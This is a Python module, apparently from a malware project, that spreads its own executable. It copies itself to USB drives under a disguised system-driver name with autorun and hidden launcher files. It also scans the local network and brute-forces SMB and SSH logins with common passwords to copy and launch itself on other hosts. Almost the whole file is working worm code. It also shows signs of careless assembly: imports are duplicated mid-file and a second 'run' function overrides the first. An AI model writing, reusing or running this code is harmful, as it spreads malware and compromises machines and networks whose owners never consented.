# modules/propagator.py

import os
import sys
import shutil
import platform
import socket
import subprocess
import getpass

def detectar_unidades_usb():
    """Detecta y retorna una lista de rutas de dispositivos USB conectados."""
    drives = []
    if os.name == "nt":
        # Windows: lista todas las unidades extraíbles (USB)
        from string import ascii_uppercase
        try:
            import ctypes
            for letter in ascii_uppercase:
                path = f"{letter}:\\"
                if os.path.exists(path):
                    drive_type = ctypes.windll.kernel32.GetDriveTypeW(f"{letter}:\\")
                    # DRIVE_REMOVABLE == 2
                    if drive_type == 2:
                        drives.append(path)
        except Exception:
            pass
    else:
        # Linux: busca montajes típicos de USB (media, run, mnt)
        possible_mounts = ["/media", "/run/media", "/mnt"]
        for base in possible_mounts:
            if os.path.exists(base):
                for sub in os.listdir(base):
                    usb_path = os.path.join(base, sub)
                    if os.path.ismount(usb_path):
                        drives.append(usb_path)
    return drives

def copiar_binario_usb(destino_dir):
    """Copia el ejecutable a la raíz del USB y genera el archivo de arranque."""
    src = os.path.abspath(sys.argv[0])
    nombre_destino = "sysdrv.exe" if os.name == "nt" else ".sysdrv"
    destino = os.path.join(destino_dir, nombre_destino)
    try:
        shutil.copy2(src, destino)
        # Para Windows: crea autorun.inf (requiere privilegios o click social)
        if os.name == "nt":
            autorun = os.path.join(destino_dir, "autorun.inf")
            with open(autorun, "w") as f:
                f.write(f"[Autorun]\nopen={nombre_destino}\naction=Open folder to view files\nicon=shell32.dll,4\n")
        else:
            # Para Linux: crea un .desktop oculto (click social)
            desktop = os.path.join(destino_dir, ".sysdrv.desktop")
            with open(desktop, "w") as f:
                f.write(f"[Desktop Entry]\nType=Application\nName=USB Drive\nExec={destino}\nTerminal=false\nHidden=true\n")
        return True
    except Exception:
        return False
import socket
import subprocess
import getpass

def detectar_hosts_red():
    """Escanea la red local para descubrir hosts activos."""
    hosts = []
    try:
        ip_base = socket.gethostbyname(socket.gethostname()).rsplit('.', 1)[0] + '.'
        for i in range(1, 255):
            ip = f"{ip_base}{i}"
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.3)
                result = sock.connect_ex((ip, 445))  # Puerto 445 (SMB) primero
                if result == 0:
                    hosts.append(ip)
                sock.close()
            except Exception:
                continue
    except Exception:
        pass
    return hosts

def fuerza_bruta_smb(ip, usuarios=None, passwords=None):
    """Intenta copiar el binario a la máquina Windows vía SMB."""
    # usuarios y passwords pueden ser listas, o usa por defecto los más comunes
    if usuarios is None:
        usuarios = ["Administrator", "admin", "user", getpass.getuser()]
    if passwords is None:
        passwords = ["", "admin", "password", "1234", "123456", getpass.getuser()]
    binario = os.path.abspath(sys.argv[0])
    for u in usuarios:
        for p in passwords:
            try:
                destino = f"\\\\{ip}\\C$\\Windows\\Temp\\sysdrv.exe"
                cmd = f'net use \\\\{ip}\\C$ {p} /user:{u} && copy "{binario}" "{destino}" && net use \\\\{ip}\\C$ /delete'
                res = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                if res.returncode == 0:
                    return True
            except Exception:
                continue
    return False

def fuerza_bruta_ssh(ip, usuarios=None, passwords=None):
    """Intenta copiar el binario a Linux vía SSH (scp)."""
    if usuarios is None:
        usuarios = ["root", getpass.getuser()]
    if passwords is None:
        passwords = ["", "toor", "password", "1234", getpass.getuser()]
    binario = os.path.abspath(sys.argv[0])
    for u in usuarios:
        for p in passwords:
            try:
                cmd = f'sshpass -p "{p}" scp -o StrictHostKeyChecking=no "{binario}" {u}@{ip}:/tmp/sysdrv && sshpass -p "{p}" ssh -o StrictHostKeyChecking=no {u}@{ip} "chmod +x /tmp/sysdrv; nohup /tmp/sysdrv &"'
                res = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                if res.returncode == 0:
                    return True
            except Exception:
                continue
    return False

def run(cmd, *args):
    if cmd == "usb":
        unidades = detectar_unidades_usb()
        resultados = []
        for usb in unidades:
            ok = copiar_binario_usb(usb)
            resultados.append(f"{usb}: {'OK' if ok else 'FAIL'}")
        return "USB propagation: " + ", ".join(resultados)
    elif cmd == "network":
        hosts = detectar_hosts_red()
        res = []
        for ip in hosts:
            if os.name == "nt":
                ok = fuerza_bruta_smb(ip)
                res.append(f"{ip}: {'OK' if ok else 'FAIL'} (SMB)")
            else:
                ok = fuerza_bruta_ssh(ip)
                res.append(f"{ip}: {'OK' if ok else 'FAIL'} (SSH)")
        return "Network propagation: " + ", ".join(res)
    else:
        return "[!] Comando no soportado en propagator."

def run(cmd, *args):
    if cmd == "usb":
        unidades = detectar_unidades_usb()
        resultados = []
        for usb in unidades:
            ok = copiar_binario_usb(usb)
            resultados.append(f"{usb}: {'OK' if ok else 'FAIL'}")
        return "USB propagation: " + ", ".join(resultados)
    else:
        return "[!] Comando no soportado en propagator."

